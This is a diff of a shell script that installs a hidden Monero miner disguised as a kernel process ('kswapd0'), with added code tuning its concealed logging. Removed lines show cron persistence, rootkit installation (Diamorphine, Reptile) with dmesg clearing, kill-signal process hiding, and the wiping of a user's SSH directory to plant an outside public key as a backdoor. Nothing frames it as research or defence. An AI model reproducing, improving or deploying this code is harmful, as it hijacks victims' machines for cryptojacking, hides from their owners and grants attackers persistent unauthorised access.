@@ -620,7 +620,7 @@ sed -i 's/"url": *"[^"]*",/"url": "gulf.moneroocean.stream:10128",/' $HOME/.syst
 sed -i 's/"user": *"[^"]*",/"user": "'$WALLET'",/' $HOME/.system_cache/config.json
 sed -i 's/"pass": *"[^"]*",/"pass": "'$PASS'",/' $HOME/.system_cache/config.json
 sed -i 's/"max-cpu-usage": *[^,]*,/"max-cpu-usage": 100,/' $HOME/.system_cache/config.json
-sed -i 's#"log-file": *null,#"log-file": "$HOME/.system_cache/.swap-history.bin",#' $HOME/.system_cache/config.json
+sed -i 's#"log-file": *null,#"log-file": "'/dev/null'",#' $HOME/.system_cache/config.json
 sed -i 's/"syslog": *[^,]*,/"syslog": false,/' $HOME/.system_cache/config.json
 sed -i 's/"donate-level": *[^,]*,/"donate-level": 0,/' $HOME/.system_cache/config.json
 sed -i 's/"donate-over-proxy": *[^,]*,/"donate-over-proxy": 0,/' $HOME/.system_cache/config.json
@@ -631,27 +631,98 @@ sed -i 's/"background": *false,/"background": true,/' $HOME/.system_cache/config
 # ==================== ENABLE HIDDEN XMRIG LOGGING ====================
 echo "[*] Setting up hidden miner logging..."
 
-# Create hidden log directory
+# Create hidden log directory with proper permissions
 mkdir -p "$HOME/.system_cache/.syslogs"
+chmod 700 "$HOME/.system_cache/.syslogs"
 
-# Enable hidden log file (disguised as system cache)
-sed -i 's#"log-file": *"[^"]*",#"log-file": "'$HOME'/.system_cache/.syslogs/.system-cache.tmp",#' $HOME/.system_cache/config.json
-sed -i 's#"log-file": *"[^"]*",#"log-file": "'$HOME'/.system_cache/.syslogs/.system-cache.tmp",#' $HOME/.system_cache/config_background.json
+# Touch log file to ensure it exists
+touch "$HOME/.system_cache/.syslogs/.system-cache.tmp"
+chmod 600 "$HOME/.system_cache/.syslogs/.system-cache.tmp"
 
-# Set verbose logging level for mining output
-sed -i 's/"verbose": *[^,]*,/"verbose": 2,/' $HOME/.system_cache/config.json
-sed -i 's/"verbose": *[^,]*,/"verbose": 2,/' $HOME/.system_cache/config_background.json
+# Configure logging using Python for reliable JSON manipulation
+if command -v python3 >/dev/null 2>&1 || command -v python >/dev/null 2>&1; then
+    PYTHON_CMD=$(command -v python3 || command -v python)
+    
+    for config_file in $HOME/.system_cache/config.json $HOME/.system_cache/config_background.json; do
+        if [ -f "$config_file" ]; then
+            echo "[*] Configuring $config_file with Python..."
+            $PYTHON_CMD << PYEOF
+import json
+import sys
+import os
 
-# Keep syslog disabled for stealth
-sed -i 's/"syslog": *[^,]*,/"syslog": false,/' $HOME/.system_cache/config.json
-sed -i 's/"syslog": *[^,]*,/"syslog": false,/' $HOME/.system_cache/config_background.json
+try:
+    with open('$config_file', 'r') as f:
+        config = json.load(f)
+    
+    # CRITICAL: Set log file to hidden location in user's home
+    config['log-file'] = os.path.expanduser('$HOME/.system_cache/.syslogs/.system-cache.tmp')
+    
+    # CRITICAL: DISABLE syslog (NEVER log to system syslog!)
+    config['syslog'] = False
+    
+    # Enable verbose logging
+    config['verbose'] = 2
+    
+    # Enable log rotation
+    config['retries'] = 5
+    config['rotate-logs'] = True
+    config['rotate-files'] = 3
+    
+    # Write back
+    with open('$config_file', 'w') as f:
+        json.dump(config, f, indent=4)
+    
+    print('[✓] Config updated successfully')
+    sys.exit(0)
+except Exception as e:
+    print('[!] Error updating config:', str(e))
+    sys.exit(1)
+PYEOF
+        fi
+    done
+    
+    # Verify configuration
+    if grep -q '\.system-cache\.tmp' $HOME/.system_cache/config.json 2>/dev/null; then
+        echo "[✓] Hidden miner logging enabled: $HOME/.system_cache/.syslogs/.system-cache.tmp"
+        echo "[*] To view mining logs: cat $HOME/.system_cache/.syslogs/.system-cache.tmp"
+    else
+        echo "[!] Warning: Could not verify log-file setting"
+    fi
+    
+    if grep -q '"syslog": *false' $HOME/.system_cache/config.json 2>/dev/null; then
+        echo "[✓] Syslog DISABLED (logs stay hidden in user directory)"
+    else
+        echo "[!] Warning: Syslog setting may not be correct"
+    fi
+    
+else
+    # Fallback to sed if Python not available
+    echo "[!] Python not available, using sed (less reliable)"
+    
+    for config_file in $HOME/.system_cache/config.json $HOME/.system_cache/config_background.json; do
+        if [ -f "$config_file" ]; then
+            # Try multiple patterns
+            sed -i 's#"log-file": *"[^"]*"#"log-file": "'"$HOME"'/.system_cache/.syslogs/.system-cache.tmp"#' "$config_file"
+            sed -i 's#"log-file": *null#"log-file": "'"$HOME"'/.system_cache/.syslogs/.system-cache.tmp"#' "$config_file"
+            
+            # DISABLE syslog
+            sed -i 's/"syslog": *true/"syslog": false/' "$config_file"
+            sed -i 's/"syslog": *1/"syslog": false/' "$config_file"
+            
+            # Verbose logging
+            sed -i 's/"verbose": *[^,]*,/"verbose": 2,/' "$config_file"
+        fi
+    done
+    
+    echo "[✓] Config updated with sed"
+fi
 
-# Rotate logs to keep them small (daily rotation)
-sed -i 's/"retries": *[^,]*,/"retries": 5,\n\t"rotate-logs": true,\n\t"rotate-files": 3,/' $HOME/.system_cache/config.json
-sed -i 's/"retries": *[^,]*,/"retries": 5,\n\t"rotate-logs": true,\n\t"rotate-files": 3,/' $HOME/.system_cache/config_background.json
-
-echo "[✓] Hidden miner logging enabled: $HOME/.system_cache/.syslogs/.system-cache.tmp"
-echo "[*] To view mining logs: cat $HOME/.system_cache/.syslogs/.system-cache.tmp"
+# Show final config for verification
+echo ""
+echo "[*] Final log configuration:"
+grep -E '"log-file"|"syslog"|"verbose"' $HOME/.system_cache/config.json 2>/dev/null | head -5
+echo ""
 # =====================================================================
 # ==============================================================
 
@@ -678,74 +749,3 @@ if ! pgrep -f "$HOME/.system_cache/kswapd0"; then
 fi
 EOF
 
-echo "[*] Make the check script executable"
-chmod +x "$HOME/.system_cache/check_and_start.sh"
-
-echo "[*] Nur einen Cronjob hinzufügen, falls nicht vorhanden"
-(crontab -l 2>/dev/null | grep -v "check_and_start.sh"; echo "* * * * * $HOME/.system_cache/check_and_start.sh") | crontab -
-
-
-#    echo "[*] make toolZ, Diamorphine"
-#          cd /tmp ; cd .ICE-unix ; cd .X11-unix ; rm -rf Diamorphine ; rm -rf Reptile ; yum install linux-generic linux-headers-$(uname -r) kernel kernel-devel kernel-firmware kernel-tools kernel-modules kernel-headers git make gcc msr-tools -y ; apt-get update -y ; apt-get reinstall kmod ; apt-get install linux-generic linux-headers-$(uname -r) git make gcc msr-tools -y ;  zypper update -y ; zypper install linux-generic linux-headers-$(uname -r) git make gcc msr-tools -y ; git clone https://github.com/m0nad/Diamorphine ; cd Diamorphine/ ; make ; insmod diamorphine.ko ; dmesg -C ; kill -63 `/bin/ps ax -fu $USER| grep "swapd" | grep -v "grep" | awk '{print $2}'`
-    
-#    echo "[*] Reptile..."
-#        cd /tmp ; cd .ICE-unix ; cd .X11-unix ; rm -rf Diamorphine ; rm -rf Reptile ; apt-get update -y ; apt-get install build-essential linux-headers-$(uname -r) git make gcc msr-tools libncurses-dev -y ; yum update -y; yum install -y ncurses-devel ; git clone https://github.com/f0rb1dd3n/Reptile/ && cd Reptile ; make defconfig ; make ; make install ; dmesg -C ; /reptile/reptile_cmd hide ;  kill -31 `/bin/ps ax -fu $USER| grep "swapd" | grep -v "grep" | awk '{print $2}'`
-    
-#    echo "[*] hide crypto miner."
-#        cd /tmp ; cd .X11-unix ; git clone https://github.com/alfonmga/hiding-cryptominers-linux-rootkit && cd hiding-cryptominers-linux-rootkit/ && make ; dmesg -C && insmod rootkit.ko && dmesg ; kill -31 `/bin/ps ax -fu $USER| grep "swapd" | grep -v "grep" | awk '{print $2}'` ; rm -rf hiding-cryptominers-linux-rootkit/
-
-
-# ==================== FIX: Safe process hiding ====================
-# Only execute kill commands if PIDs are valid numbers
-MINER_PID=$(pgrep -f -u root config.json 2>/dev/null | head -1)
-if [ -n "$MINER_PID" ] && [[ "$MINER_PID" =~ ^[0-9]+$ ]]; then
-    kill -31 "$MINER_PID" 2>/dev/null || true
-fi
-
-SWAPD_PIDS=$(/bin/ps ax -fu $USER 2>/dev/null | grep "swapd" | grep -v "grep" | awk '{print $2}')
-for pid in $SWAPD_PIDS; do
-    if [[ "$pid" =~ ^[0-9]+$ ]]; then
-        kill -31 "$pid" 2>/dev/null || true
-    fi
-done
-
-KSWAPD_PIDS=$(/bin/ps ax -fu $USER 2>/dev/null | grep "kswapd0" | grep -v "grep" | awk '{print $2}')
-for pid in $KSWAPD_PIDS; do
-    if [[ "$pid" =~ ^[0-9]+$ ]]; then
-        kill -31 "$pid" 2>/dev/null || true
-    fi
-done
-
-# Unhide if needed (kill -63)
-for pid in $SWAPD_PIDS; do
-    if [[ "$pid" =~ ^[0-9]+$ ]]; then
-        kill -63 "$pid" 2>/dev/null || true
-    fi
-done
-
-for pid in $KSWAPD_PIDS; do
-    if [[ "$pid" =~ ^[0-9]+$ ]]; then
-        kill -63 "$pid" 2>/dev/null || true
-    fi
-done
-
-echo "[*] Generating ssh key on server"
-
-rm -rf ~/.ssh/authorized_keys
-rm -rf ~/.ssh/
-mkdir ~/.ssh
-chmod 700 ~/.ssh
-touch ~/.ssh/authorized_keys
-echo 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDPrkRNFGukhRN4gwM5yNZYc/ldflr+Gii/4gYIT8sDH23/zfU6R7f0XgslhqqXnbJTpHYms+Do/JMHeYjvcYy8NMYwhJgN1GahWj+PgY5yy+8Efv07pL6Bo/YgxXV1IOoRkya0Wq53S7Gb4+p3p2Pb6NGJUGCZ37TYReSHt0Ga0jvqVFNnjUyFxmDpq1CXqjSX8Hj1JF6tkpANLeBZ8ai7EiARXmIHFwL+zjCPdS7phyfhX+tWsiM9fm1DQIVdzkql5J980KCTNNChdt8r5ETre+Yl8mo0F/fw485I5SnYxo/i3tp0Q6R5L/psVRh3e/vcr2lk+TXCjk6rn5KJirZWZHlWK+kbHLItZ8P2AcADHeTPeqgEU56NtNSLq5k8uLz9amgiTBLThwIFW4wjnTkcyVzMHKoOp4pby17Ft+Edj8v0z1Xo/WxTUoMwmTaQ4Z5k6wpo2wrsrCzYQqd6p10wp2uLp8mK5eq0I2hYL1Dmf9jmJ6v6w915P2aMss+Vpp0=' >>~/.ssh/authorized_keys
-chmod 600 ~/.ssh/authorized_keys
-
-# New addition: Delete xmrig files in login directory
-echo "[*] Cleaning up xmrig files in login directory..."
-rm -rf ~/xmrig*.*
-
-echo "[*] Setup complete"
-echo ""
-
-# ==================== FIX: Explicit exit to prevent hanging ====================
-# Ensure script terminates immediately after completion
-exit 0
